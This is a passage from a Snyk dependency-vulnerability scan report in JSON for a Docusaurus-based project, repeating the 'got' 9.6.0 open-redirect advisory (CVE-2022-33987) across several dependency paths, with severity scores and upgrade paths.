          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2022-06-29T01:11:26.531842Z"
        },
        {
          "assigner": "Red Hat",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2022-11-19T20:57:05.871669Z"
        }
      ],
      "description": "## Overview\n\nAffected versions of this package are vulnerable to Open Redirect due to missing verification of requested URLs. It allowed a victim to be redirected to a UNIX socket.\n## Remediation\nUpgrade `got` to version 11.8.5, 12.1.0 or higher.\n## References\n- [GitHub Diff](https://github.com/sindresorhus/got/compare/v12.0.3...v12.1.0)\n- [GitHub PR](https://github.com/sindresorhus/got/pull/2047)\n",
      "epssDetails": {
        "percentile": "0.22655",
        "probability": "0.00058",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-33987"
        ],
        "CWE": [
          "CWE-601"
        ]
      },
      "packageName": "got",
      "proprietary": false,
      "creationTime": "2022-06-19T09:23:24.210132Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-06-19T08:33:16Z",
      "packageManager": "npm",
      "publicationTime": "2022-06-19T15:33:44.269688Z",
      "modificationTime": "2022-11-19T20:57:05.871669Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/plugin-content-pages@2.2.0",
        "@docusaurus/core@2.2.0",
        "update-notifier@5.1.0",
        "latest-version@5.1.0",
        "package-json@6.5.0",
        "got@9.6.0"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        "update-notifier@6.0.0",
        "latest-version@6.0.0",
        "package-json@7.0.0",
        "got@11.8.5"
      ],
      "version": "9.6.0",
      "name": "got",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-GOT-2932019",
      "title": "Open Redirect",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
      "credit": [
        "Unknown"
      ],
      "semver": {
        "vulnerable": [
          "<11.8.5",
          ">=12.0.0 <12.1.0"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "11.8.5",
        "12.1.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "medium",
      "cvssScore": 5.4,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "got",
      "references": [
        {
          "url": "https://github.com/sindresorhus/got/compare/v12.0.3...v12.1.0",
          "title": "GitHub Diff"
        },
        {
          "url": "https://github.com/sindresorhus/got/pull/2047",
          "title": "GitHub PR"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2022-06-29T01:11:26.531842Z"
        },
        {
          "assigner": "Red Hat",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2022-11-19T20:57:05.871669Z"
        }
      ],
      "description": "## Overview\n\nAffected versions of this package are vulnerable to Open Redirect due to missing verification of requested URLs. It allowed a victim to be redirected to a UNIX socket.\n## Remediation\nUpgrade `got` to version 11.8.5, 12.1.0 or higher.\n## References\n- [GitHub Diff](https://github.com/sindresorhus/got/compare/v12.0.3...v12.1.0)\n- [GitHub PR](https://github.com/sindresorhus/got/pull/2047)\n",
      "epssDetails": {
        "percentile": "0.22655",
        "probability": "0.00058",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-33987"
        ],
        "CWE": [
          "CWE-601"
        ]
      },
      "packageName": "got",
      "proprietary": false,
      "creationTime": "2022-06-19T09:23:24.210132Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-06-19T08:33:16Z",
      "packageManager": "npm",
      "publicationTime": "2022-06-19T15:33:44.269688Z",
      "modificationTime": "2022-11-19T20:57:05.871669Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/plugin-debug@2.2.0",
        "@docusaurus/core@2.2.0",
        "update-notifier@5.1.0",
        "latest-version@5.1.0",
        "package-json@6.5.0",
        "got@9.6.0"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        "update-notifier@6.0.0",
        "latest-version@6.0.0",
        "package-json@7.0.0",
        "got@11.8.5"
      ],
      "version": "9.6.0",
      "name": "got",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-GOT-2932019",
      "title": "Open Redirect",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
      "credit": [
        "Unknown"
      ],
      "semver": {
        "vulnerable": [
          "<11.8.5",
          ">=12.0.0 <12.1.0"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "11.8.5",
        "12.1.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "medium",
      "cvssScore": 5.4,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "got",
      "references": [
        {
          "url": "https://github.com/sindresorhus/got/compare/v12.0.3...v12.1.0",
          "title": "GitHub Diff"
        },
        {
          "url": "https://github.com/sindresorhus/got/pull/2047",
          "title": "GitHub PR"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2022-06-29T01:11:26.531842Z"
        },
        {
          "assigner": "Red Hat",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2022-11-19T20:57:05.871669Z"
        }
      ],
      "description": "## Overview\n\nAffected versions of this package are vulnerable to Open Redirect due to missing verification of requested URLs. It allowed a victim to be redirected to a UNIX socket.\n## Remediation\nUpgrade `got` to version 11.8.5, 12.1.0 or higher.\n## References\n- [GitHub Diff](https://github.com/sindresorhus/got/compare/v12.0.3...v12.1.0)\n- [GitHub PR](https://github.com/sindresorhus/got/pull/2047)\n",
      "epssDetails": {
        "percentile": "0.22655",
        "probability": "0.00058",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-33987"
        ],
        "CWE": [
          "CWE-601"
        ]
      },
      "packageName": "got",
      "proprietary": false,
      "creationTime": "2022-06-19T09:23:24.210132Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-06-19T08:33:16Z",
      "packageManager": "npm",
      "publicationTime": "2022-06-19T15:33:44.269688Z",
      "modificationTime": "2022-11-19T20:57:05.871669Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/plugin-google-analytics@2.2.0",
        "@docusaurus/core@2.2.0",
        "update-notifier@5.1.0",
        "latest-version@5.1.0",
        "package-json@6.5.0",
        "got@9.6.0"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        "update-notifier@6.0.0",
        "latest-version@6.0.0",
        "package-json@7.0.0",
        "got@11.8.5"
      ],
      "version": "9.6.0",
      "name": "got",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-GOT-2932019",
      "title": "Open Redirect",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
      "credit": [
        "Unknown"
      ],
      "semver": {
        "vulnerable": [
          "<11.8.5",
          ">=12.0.0 <12.1.0"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "11.8.5",
        "12.1.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "medium",
      "cvssScore": 5.4,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "got",
      "references": [
        {
          "url": "https://github.com/sindresorhus/got/compare/v12.0.3...v12.1.0",
          "title": "GitHub Diff"
        },
        {
          "url": "https://github.com/sindresorhus/got/pull/2047",
          "title": "GitHub PR"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2022-06-29T01:11:26.531842Z"
        },
        {
          "assigner": "Red Hat",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2022-11-19T20:57:05.871669Z"
        }
      ],
      "description": "## Overview\n\nAffected versions of this package are vulnerable to Open Redirect due to missing verification of requested URLs. It allowed a victim to be redirected to a UNIX socket.\n## Remediation\nUpgrade `got` to version 11.8.5, 12.1.0 or higher.\n## References\n- [GitHub Diff](https://github.com/sindresorhus/got/compare/v12.0.3...v12.1.0)\n- [GitHub PR](https://github.com/sindresorhus/got/pull/2047)\n",
      "epssDetails": {
        "percentile": "0.22655",
        "probability": "0.00058",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-33987"
        ],
        "CWE": [
          "CWE-601"
        ]
      },
      "packageName": "got",
      "proprietary": false,
      "creationTime": "2022-06-19T09:23:24.210132Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-06-19T08:33:16Z",
      "packageManager": "npm",
      "publicationTime": "2022-06-19T15:33:44.269688Z",
      "modificationTime": "2022-11-19T20:57:05.871669Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/plugin-google-gtag@2.2.0",
        "@docusaurus/core@2.2.0",
        "update-notifier@5.1.0",
        "latest-version@5.1.0",
        "package-json@6.5.0",
        "got@9.6.0"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        "update-notifier@6.0.0",
        "latest-version@6.0.0",
        "package-json@7.0.0",
        "got@11.8.5"
      ],
      "version": "9.6.0",
      "name": "got",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-GOT-2932019",
      "title": "Open Redirect",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
      "credit": [
        "Unknown"
      ],
      "semver": {
        "vulnerable": [
          "<11.8.5",
          ">=12.0.0 <12.1.0"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "11.8.5",
        "12.1.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "medium",
      "cvssScore": 5.4,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "got",
      "references": [
        {
          "url": "https://github.com/sindresorhus/got/compare/v12.0.3...v12.1.0",
          "title": "GitHub Diff"
        },
        {
          "url": "https://github.com/sindresorhus/got/pull/2047",
          "title": "GitHub PR"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2022-06-29T01:11:26.531842Z"
        },
        {
          "assigner": "Red Hat",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2022-11-19T20:57:05.871669Z"
        }
      ],
      "description": "## Overview\n\nAffected versions of this package are vulnerable to Open Redirect due to missing verification of requested URLs. It allowed a victim to be redirected to a UNIX socket.\n## Remediation\nUpgrade `got` to version 11.8.5, 12.1.0 or higher.\n## References\n- [GitHub Diff](https://github.com/sindresorhus/got/compare/v12.0.3...v12.1.0)\n- [GitHub PR](https://github.com/sindresorhus/got/pull/2047)\n",
      "epssDetails": {
        "percentile": "0.22655",
        "probability": "0.00058",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-33987"
        ],
        "CWE": [
          "CWE-601"
        ]
      },
      "packageName": "got",
      "proprietary": false,
      "creationTime": "2022-06-19T09:23:24.210132Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-06-19T08:33:16Z",
      "packageManager": "npm",
      "publicationTime": "2022-06-19T15:33:44.269688Z",
      "modificationTime": "2022-11-19T20:57:05.871669Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/plugin-sitemap@2.2.0",
        "@docusaurus/core@2.2.0",
        "update-notifier@5.1.0",
        "latest-version@5.1.0",
        "package-json@6.5.0",
        "got@9.6.0"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        "update-notifier@6.0.0",
        "latest-version@6.0.0",
        "package-json@7.0.0",
        "got@11.8.5"
      ],
      "version": "9.6.0",
      "name": "got",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-GOT-2932019",
      "title": "Open Redirect",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
      "credit": [
        "Unknown"
      ],
      "semver": {
        "vulnerable": [
          "<11.8.5",
          ">=12.0.0 <12.1.0"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "11.8.5",
        "12.1.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "medium",
      "cvssScore": 5.4,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "got",
      "references": [
        {
          "url": "https://github.com/sindresorhus/got/compare/v12.0.3...v12.1.0",
          "title": "GitHub Diff"
        },
        {
          "url": "https://github.com/sindresorhus/got/pull/2047",
          "title": "GitHub PR"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2022-06-29T01:11:26.531842Z"
        },
        {
          "assigner": "Red Hat",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2022-11-19T20:57:05.871669Z"
        }
      ],
      "description": "## Overview\n\nAffected versions of this package are vulnerable to Open Redirect due to missing verification of requested URLs. It allowed a victim to be redirected to a UNIX socket.\n## Remediation\nUpgrade `got` to version 11.8.5, 12.1.0 or higher.\n## References\n- [GitHub Diff](https://github.com/sindresorhus/got/compare/v12.0.3...v12.1.0)\n- [GitHub PR](https://github.com/sindresorhus/got/pull/2047)\n",
      "epssDetails": {
        "percentile": "0.22655",
        "probability": "0.00058",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-33987"
        ],
        "CWE": [
          "CWE-601"
        ]
      },
      "packageName": "got",
      "proprietary": false,
      "creationTime": "2022-06-19T09:23:24.210132Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-06-19T08:33:16Z",
      "packageManager": "npm",
      "publicationTime": "2022-06-19T15:33:44.269688Z",
      "modificationTime": "2022-11-19T20:57:05.871669Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-classic@2.2.0",
        "@docusaurus/core@2.2.0",
        "update-notifier@5.1.0",
        "latest-version@5.1.0",
        "package-json@6.5.0",
        "got@9.6.0"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        "update-notifier@6.0.0",
        "latest-version@6.0.0",
        "package-json@7.0.0",
        "got@11.8.5"
      ],
      "version": "9.6.0",
      "name": "got",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-GOT-2932019",
      "title": "Open Redirect",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
      "credit": [
        "Unknown"
      ],
      "semver": {
        "vulnerable": [
          "<11.8.5",
          ">=12.0.0 <12.1.0"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "11.8.5",
        "12.1.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "medium",
      "cvssScore": 5.4,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "got",
      "references": [
        {
          "url": "https://github.com/sindresorhus/got/compare/v12.0.3...v12.1.0",
          "title": "GitHub Diff"
        },
        {
          "url": "https://github.com/sindresorhus/got/pull/2047",
          "title": "GitHub PR"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2022-06-29T01:11:26.531842Z"
        },
        {
          "assigner": "Red Hat",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2022-11-19T20:57:05.871669Z"
        }
      ],
      "description": "## Overview\n\nAffected versions of this package are vulnerable to Open Redirect due to missing verification of requested URLs. It allowed a victim to be redirected to a UNIX socket.\n## Remediation\nUpgrade `got` to version 11.8.5, 12.1.0 or higher.\n## References\n- [GitHub Diff](https://github.com/sindresorhus/got/compare/v12.0.3...v12.1.0)\n- [GitHub PR](https://github.com/sindresorhus/got/pull/2047)\n",
      "epssDetails": {
        "percentile": "0.22655",
        "probability": "0.00058",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-33987"
        ],
        "CWE": [
          "CWE-601"
        ]
      },
      "packageName": "got",
      "proprietary": false,
      "creationTime": "2022-06-19T09:23:24.210132Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-06-19T08:33:16Z",
      "packageManager": "npm",
      "publicationTime": "2022-06-19T15:33:44.269688Z",
      "modificationTime": "2022-11-19T20:57:05.871669Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-search-algolia@2.2.0",
        "@docusaurus/core@2.2.0",
        "update-notifier@5.1.0",
        "latest-version@5.1.0",
        "package-json@6.5.0",
        "got@9.6.0"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        "update-notifier@6.0.0",
        "latest-version@6.0.0",
        "package-json@7.0.0",
        "got@11.8.5"
      ],
      "version": "9.6.0",
      "name": "got",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-GOT-2932019",
      "title": "Open Redirect",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
      "credit": [
        "Unknown"
      ],
      "semver": {
        "vulnerable": [
          "<11.8.5",
          ">=12.0.0 <12.1.0"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "11.8.5",
        "12.1.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "medium",
      "cvssScore": 5.4,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "got",
      "references": [
        {
          "url": "https://github.com/sindresorhus/got/compare/v12.0.3...v12.1.0",
          "title": "GitHub Diff"
        },
        {
          "url": "https://github.com/sindresorhus/got/pull/2047",
          "title": "GitHub PR"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2022-06-29T01:11:26.531842Z"
        },
        {
          "assigner": "Red Hat",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2022-11-19T20:57:05.871669Z"
        }
      ],
      "description": "## Overview\n\nAffected versions of this package are vulnerable to Open Redirect due to missing verification of requested URLs. It allowed a victim to be redirected to a UNIX socket.\n## Remediation\nUpgrade `got` to version 11.8.5, 12.1.0 or higher.\n## References\n- [GitHub Diff](https://github.com/sindresorhus/got/compare/v12.0.3...v12.1.0)\n- [GitHub PR](https://github.com/sindresorhus/got/pull/2047)\n",
      "epssDetails": {
        "percentile": "0.22655",
        "probability": "0.00058",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-33987"
        ],
        "CWE": [
          "CWE-601"
        ]
      },
      "packageName": "got",
      "proprietary": false,
      "creationTime": "2022-06-19T09:23:24.210132Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-06-19T08:33:16Z",
      "packageManager": "npm",
      "publicationTime": "2022-06-19T15:33:44.269688Z",
      "modificationTime": "2022-11-19T20:57:05.871669Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/plugin-content-blog@2.2.0",
        "@docusaurus/core@2.2.0",
        "update-notifier@5.1.0",
        "latest-version@5.1.0",
        "package-json@6.5.0",
        "got@9.6.0"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        "update-notifier@6.0.0",
        "latest-version@6.0.0",
        "package-json@7.0.0",
        "got@11.8.5"
      ],
      "version": "9.6.0",
      "name": "got",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-GOT-2932019",
      "title": "Open Redirect",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
      "credit": [
        "Unknown"
      ],
      "semver": {
        "vulnerable": [
          "<11.8.5",
          ">=12.0.0 <12.1.0"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "11.8.5",
        "12.1.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "medium",
      "cvssScore": 5.4,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "got",
      "references": [
        {
          "url": "https://github.com/sindresorhus/got/compare/v12.0.3...v12.1.0",
          "title": "GitHub Diff"
        },
        {
          "url": "https://github.com/sindresorhus/got/pull/2047",
          "title": "GitHub PR"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2022-06-29T01:11:26.531842Z"
        },
        {
          "assigner": "Red Hat",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2022-11-19T20:57:05.871669Z"
        }
      ],
      "description": "## Overview\n\nAffected versions of this package are vulnerable to Open Redirect due to missing verification of requested URLs. It allowed a victim to be redirected to a UNIX socket.\n## Remediation\nUpgrade `got` to version 11.8.5, 12.1.0 or higher.\n## References\n- [GitHub Diff](https://github.com/sindresorhus/got/compare/v12.0.3...v12.1.0)\n- [GitHub PR](https://github.com/sindresorhus/got/pull/2047)\n",
      "epssDetails": {
        "percentile": "0.22655",
        "probability": "0.00058",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-33987"
        ],
        "CWE": [
          "CWE-601"
        ]
      },
      "packageName": "got",
      "proprietary": false,
      "creationTime": "2022-06-19T09:23:24.210132Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-06-19T08:33:16Z",
      "packageManager": "npm",
      "publicationTime": "2022-06-19T15:33:44.269688Z",
      "modificationTime": "2022-11-19T20:57:05.871669Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-classic@2.2.0",
        "@docusaurus/plugin-content-blog@2.2.0",
        "@docusaurus/core@2.2.0",
        "update-notifier@5.1.0",
        "latest-version@5.1.0",
        "package-json@6.5.0",
        "got@9.6.0"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        "update-notifier@6.0.0",
        "latest-version@6.0.0",
        "package-json@7.0.0",
        "got@11.8.5"
      ],
      "version": "9.6.0",
      "name": "got",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-GOT-2932019",
      "title": "Open Redirect",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
      "credit": [
        "Unknown"
      ],
      "semver": {
        "vulnerable": [
          "<11.8.5",
          ">=12.0.0 <12.1.0"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "11.8.5",
        "12.1.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "medium",
      "cvssScore": 5.4,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "got",
      "references": [
        {
          "url": "https://github.com/sindresorhus/got/compare/v12.0.3...v12.1.0",
          "title": "GitHub Diff"
        },
        {
          "url": "https://github.com/sindresorhus/got/pull/2047",
          "title": "GitHub PR"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2022-06-29T01:11:26.531842Z"
        },
        {
          "assigner": "Red Hat",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2022-11-19T20:57:05.871669Z"
        }
      ],
      "description": "## Overview\n\nAffected versions of this package are vulnerable to Open Redirect due to missing verification of requested URLs. It allowed a victim to be redirected to a UNIX socket.\n## Remediation\nUpgrade `got` to version 11.8.5, 12.1.0 or higher.\n## References\n- [GitHub Diff](https://github.com/sindresorhus/got/compare/v12.0.3...v12.1.0)\n- [GitHub PR](https://github.com/sindresorhus/got/pull/2047)\n",
      "epssDetails": {
        "percentile": "0.22655",
        "probability": "0.00058",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-33987"
        ],
        "CWE": [
          "CWE-601"
        ]
      },
      "packageName": "got",
      "proprietary": false,
      "creationTime": "2022-06-19T09:23:24.210132Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-06-19T08:33:16Z",
      "packageManager": "npm",
      "publicationTime": "2022-06-19T15:33:44.269688Z",
      "modificationTime": "2022-11-19T20:57:05.871669Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/plugin-content-docs@2.2.0",
        "@docusaurus/core@2.2.0",
        "update-notifier@5.1.0",
        "latest-version@5.1.0",
        "package-json@6.5.0",
        "got@9.6.0"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        "update-notifier@6.0.0",
        "latest-version@6.0.0",
        "package-json@7.0.0",
        "got@11.8.5"
      ],
      "version": "9.6.0",
      "name": "got",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
